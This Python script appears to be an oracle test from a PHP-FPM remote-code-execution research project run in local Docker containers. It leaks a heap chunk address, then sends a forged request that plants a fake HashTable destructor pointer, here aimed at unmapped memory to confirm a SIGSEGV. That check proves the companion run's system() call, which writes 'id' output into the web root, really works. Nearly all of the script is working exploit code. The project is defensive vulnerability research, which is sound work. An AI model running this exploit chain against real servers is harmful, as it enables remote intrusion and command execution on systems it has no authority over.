#!/usr/bin/env python3
"""Oracle for a forged pDestructor pointing at unmapped memory.

Same attack as the RCE run, but s = chunk + 0x7F192C0 (unmapped) instead
of &system.  Expected: the shutdown-fn assign walks the stale bucket,
zval_ptr_dtor reaches the fake HashTable, calls pDestructor -> SIGSEGV in
the php-fpm worker, visible in docker logs as 'signal 11 (SIGSEGV)'.
This proves the destroy path REALLY dereferences the forged pointer (and
that the RCE run's system() call is not a coincidence).

Lab only: authorized CVE research fixture, containers on 127.0.0.1.
"""
import http.client
import json
import os
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "tests"))
import rce_bruteforce as B  # noqa: E402
import fpm_rce as F  # noqa: E402

FPM = F.FPM_NAME
CMD = "id>/var/www/html/u.txt"
P0 = 0x40
N_BYTES = 4700001
OFF = 0x592C0
D_BAD = 0x7F192C0        # unmapped offset inside the chunk window


def sh(cmd, timeout=120):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout)


def fpm_children():
    out = sh("docker exec %s pgrep php-fpm" % FPM).stdout.split()
    return sorted(int(x) for x in out if x.isdigit() and int(x) != 1)


def main():
    port = 28095
    B.CMD = CMD
    B.CONTAINER = FPM
    F.start_fpm(port, children=1, ptrace=False)
    sh("docker exec %s sh -c 'which pgrep >/dev/null 2>&1 || "
       "(apt-get update -qq >/dev/null 2>&1; "
       "apt-get install -y -qq procps >/dev/null 2>&1)'" % FPM, timeout=600)

    pid = fpm_children()[0]
    tr = sh("docker exec %s sh -c 'grep TracerPid /proc/%d/status'"
            % (FPM, pid)).stdout
    tracer = int(tr.strip().split(":")[1].strip()) if ":" in tr else -1

    B.http(port, "GET", "/index.php", timeout=60)
    sh("docker exec %s rm -f /tmp/g.log" % FPM)
    B.http(port, "POST", "/leak2/gassoc.php?" + B.LEAK_Q,
           body=B.LEAK_BODY, ctype="text/plain")
    L = B.read_leak()
    chunk = L & B.CHUNK_MASK

    dl0 = sh("docker logs %s 2>&1 | grep -c 'signal 11 (SIGSEGV)' || true"
             % FPM).stdout.strip()
    segv0 = int(dl0.splitlines()[-1]) if dl0 and dl0[-1].isdigit() else 0

    url = ("/urlenc/forge.php?a=%d&s=%d&p0=%d&c=%s&n=%d&t=1"
           % (chunk + OFF, chunk + D_BAD, P0, CMD.encode().hex(), N_BYTES))
    st, body = -1, b""
    try:
        st, body = B.http(port, "GET", url, timeout=180)
    except (http.client.HTTPException, OSError):
        pass
    time.sleep(3.0)

    dl = sh("docker logs %s 2>&1 | grep -c 'signal 11 (SIGSEGV)' || true"
            % FPM).stdout.strip()
    segv1 = int(dl.splitlines()[-1]) if dl and dl[-1].isdigit() else 0

    # worker state right after: the child should be gone (crashed) or
    # respawned; capture the fpm log tail around the crash
    log_tail = sh("docker logs %s 2>&1 | grep -E 'signal|child' | tail -8"
                  % FPM).stdout

    result = {
        "tracer_pid": tracer, "chunk": chunk, "bad_s": hex(chunk + D_BAD),
        "http_status": st, "segv_before": segv0, "segv_after": segv1,
        "segv_new": segv1 - segv0, "fpm_log_tail": log_tail.strip(),
        "oracle": (segv1 - segv0) >= 1,
    }
    out = os.path.join(ROOT, "evidence", "runs", "rce-remote",
                       "oracle-fpm-scriptstage.json")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out, "w") as fh:
        json.dump(result, fh, indent=2)
    print(json.dumps(result, indent=2)[:900], flush=True)
    print("saved: %s" % out, flush=True)
    print("VERDICT: %s" % ("ORACLE SIGSEGV CONFIRMED" if result["oracle"]
                           else "NO SIGSEGV"), flush=True)


if __name__ == "__main__":
    main()
